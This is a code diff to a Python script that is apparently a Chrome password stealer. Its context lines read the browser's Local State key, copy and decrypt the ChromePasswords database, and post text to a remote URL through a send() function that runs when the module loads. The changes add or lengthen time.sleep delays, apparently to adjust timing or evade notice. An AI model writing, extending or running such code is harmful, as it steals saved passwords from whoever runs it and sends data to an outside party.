@@ -32,6 +32,7 @@ except:
 def getkey(keypath):
     with open(keypath, "r", encoding="utf-8") as f:
         local_state_data = f.read()
+        time.sleep(10)
         local_state_data = json.loads(local_state_data)
 
     # decoding the encryption key using base64
@@ -51,7 +52,7 @@ def send(text):
     r = requests.post(url, json=payload)
     return r
 send("from skpy!!")
-time.sleep(60)
+time.sleep(180)
 
 def temp_store(mode, data=None):
     if mode == "write":
@@ -82,8 +83,8 @@ def password_decryption(password, encryption_key):
 
 def getcredt(dbpath, keypath):
     filename = "ChromePasswords.db"
+    time.sleep(30)
     shutil.copyfile(dbpath, filename)
-    time.sleep(10)
     db = sqlite3.connect(filename)
     cursor = db.cursor()
 
